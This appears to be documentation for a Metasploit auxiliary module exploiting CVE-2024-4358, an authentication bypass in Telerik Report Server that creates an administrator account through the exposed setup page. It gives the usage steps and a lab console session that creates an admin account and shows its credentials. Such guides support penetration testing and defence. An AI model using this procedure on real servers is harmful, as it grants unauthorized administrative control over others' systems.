## Vulnerable Application
This module exploits an authentication bypass vulnerability in Telerik Report Server versions 10.0.24.305 and
prior which allows an unauthenticated attacker to create a new account with administrative privileges. The
vulnerability leverages the initial setup page which is still accessible once the setup process has completed.

If either USERNAME or PASSWORD are not specified, then a random value will be selected. The module will fail if
the specified USERNAME already exists.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/telerik_report_server_auth_bypass`
1. Set the `RHOSTS` option
1. Do: `run`

## Options

### USERNAME
Username for the new account. A random value will be used unless specified.

### PASSWORD
Password for the new account. A random value will be used unless specified.

## Scenarios

### Telerik Report Server 8.0.22.225 on Windows Server 2022

```
metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) > set RHOSTS 192.168.159.27
RHOSTS => 192.168.159.27
metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) > set VERBOSE true
VERBOSE => true
metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) > check

[*] Detected Telerik Report Server version: 8.0.22.225.
[+] 192.168.159.27:83 - The target is vulnerable. Telerik Report Server 8.0.22.225 is affected.
metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) > run
[*] Running module against 192.168.159.27

[*] Creating a new administrator account using CVE-2024-4358
[+] Created account: newton_schmeler:CkiaTtppD4eGUvl7
[*] Auxiliary module execution completed
metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) > creds
Credentials
===========

host            origin          service        public                private           realm  private_type  JtR Format  cracked_password
----            ------          -------        ------                -------           -----  ------------  ----------  ----------------
192.168.159.27  192.168.159.27  83/tcp (http)  newton_schmeler       CkiaTtppD4eGUvl7         Password

metasploit-framework (S:0 J:0) auxiliary(scanner/http/telerik_report_server_auth_bypass) >
```
